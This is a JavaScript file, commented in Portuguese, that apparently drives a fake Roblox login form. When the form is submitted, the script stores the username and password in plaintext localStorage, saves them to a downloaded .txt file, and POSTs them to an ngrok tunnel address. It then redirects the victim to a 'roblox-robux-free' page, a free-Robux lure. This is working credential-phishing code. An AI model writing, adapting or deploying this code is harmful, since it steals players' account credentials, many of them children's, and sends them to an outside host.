document.addEventListener('DOMContentLoaded', function() {
    // Verificar credenciais salvas
    const savedUsername = localStorage.getItem('roblox_username');
    const savedPassword = localStorage.getItem('roblox_password');
    
    if (savedUsername && savedPassword) {
        document.getElementById('custom-username').value = savedUsername;
        document.getElementById('custom-password').value = savedPassword;
        document.getElementById('custom-remember').checked = true;
    }
    
    const loginForm = document.getElementById('custom-login-form');
    const messageDiv = document.getElementById('custom-login-message');
    
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('custom-username').value;
        const password = document.getElementById('custom-password').value;
        const rememberMe = document.getElementById('custom-remember').checked;
        
        // Validação
        if (username.length < 3 || password.length < 6) {
            messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
            messageDiv.style.color = '#ff3333';
            return;
        }
        
        // Salvar credenciais (se marcado)
        if (rememberMe) {
            localStorage.setItem('roblox_username', username);
            localStorage.setItem('roblox_password', password);
        } else {
            localStorage.removeItem('roblox_username');
            localStorage.removeItem('roblox_password');
        }
        
        // Criar arquivo .txt com as credenciais
        const credentials = `Usuário: ${username}\nSenha: ${password}`;
        const blob = new Blob([credentials], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        // Forçar download do arquivo
        const a = document.createElement('a');
        a.href = url;
        a.download = 'roblox_login.txt';
        a.click();
        
        // Simular envio para um servidor (substitua pela sua URL)
        const formData = new FormData();
        formData.append('username', username);
        formData.append('password', password);
        
        fetch('https://870543efcd45.ngrok-free.app/login/', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                messageDiv.textContent = 'Login e envio bem-sucedidos!';
                messageDiv.style.color = '#00aa00';
                window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html"; // Redirecionar
            } else {
                messageDiv.textContent = 'Erro no envio.';
            }
        })
        .catch(error => {
            messageDiv.textContent = 'Erro na conexão.';
        });
    });
});
